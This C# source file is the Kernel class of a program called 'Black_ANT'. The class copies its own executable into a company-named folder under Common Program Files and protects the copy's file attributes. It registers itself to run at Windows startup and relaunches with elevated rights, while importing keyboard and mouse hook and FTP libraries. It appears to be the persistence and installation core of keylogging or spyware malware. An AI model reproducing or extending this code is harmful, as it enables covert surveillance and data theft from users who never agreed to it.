using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.IO;

using Security;
using MouseKeyboardActivityMonitor.HookUserActivity;
using System.Threading.Tasks;
using EventArguments;
using ComponentAssembly;
using FTP;


namespace Black_ANT
{
    public class Kernel
    {
        public static event EventHandler<ReportEventArgs> ReportOccurrence = delegate { };
        public MultipleActions MA;
        public string ExecuteStartUpTargetPaths;

        public Kernel()
        {
            MA = new MultipleActions();
            ExecuteStartUpTargetPaths = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles), AppDataManager.CompanyName);
            //
            // Give MultipleActions Reports then passed to parent class events...
            //
            EventReflector.ReflectedReporter += (source, e) => ReportOccurrence(source, e);
            //
            // Report send "Start Kernel":
            ReportOccurrence(this, new ReportEventArgs("Kernel", ReportCodes.Running, "Kernel state is running"));
        }

        public void RunJubs()
        {
            //
            // Run Any Jobs
            //
            foreach (Action act in MA.Actions)
                act();
        }

        /// <summary>
        /// Check trust path to run
        /// </summary>
        /// <returns>if the application executable path is trust then return true and else return false</returns>
        public Boolean SetRunningPath()
        {
            bool isAdmin = ComponentController.IsAdmin();
            ReportOccurrence(this, new EventArguments.ReportEventArgs("kernel.SetRunningPath",
                (isAdmin ? ReportCodes.RunAsAdministrator : ReportCodes.RunAsCurrentUser),
                "The App running as {0}", (isAdmin ? "Administrator" : "Current User")));

            if (Application.StartupPath == ExecuteStartUpTargetPaths)
            {
                ComponentController.AddToStartup(true);
                ReportOccurrence(this, new EventArguments.ReportEventArgs("kernel.SetRunningPath", ReportCodes.RunFromCorrectPath, "App running as the correct path's"));
                return true;
            }
            else
            {
                try
                {
                    //
                    // Release Mutex for run another semi of this app as administrator
                    NativeMethods.mutex.ReleaseMutex();
                    NativeMethods.mutex.Close();
                    //
                    String fileDestination = Path.Combine(ExecuteStartUpTargetPaths, Path.GetFileName(Application.ExecutablePath));

                    if (!Directory.Exists(ExecuteStartUpTargetPaths)) Directory.CreateDirectory(ExecuteStartUpTargetPaths);
                    if (!File.Exists(fileDestination))
                    {
                        File.Copy(Application.ExecutablePath, fileDestination);

                        FileInfo file = new FileInfo(fileDestination);
                        file.SecureAttributer();
                    }


                    if (ComponentController.IsWindowsVistaOrHigher() && ComponentController.IsAdmin()) // must be know for Run as administrator
                    { ComponentController.RestartElevated(fileDestination); }
                    else // Run in Local User (do not run as administrator)
                    { System.Diagnostics.Process.Start(fileDestination); }

                }
                catch (Exception ex) { ReportOccurrence(this, new EventArguments.ReportEventArgs("Kernel.SetRunningPath", ex)); }
                finally { ReportOccurrence(this, new EventArguments.ReportEventArgs("kernel.SetRunningPath", ReportCodes.RunFromInCorrectPath, "App running as incorrect path's")); }
                //
            }

            return false;
        }

        ~Kernel()
        {
            ReportOccurrence(this, new ReportEventArgs("Kernel", ReportCodes.Disposed, "Kernel Disposed"));
        }
    }
}
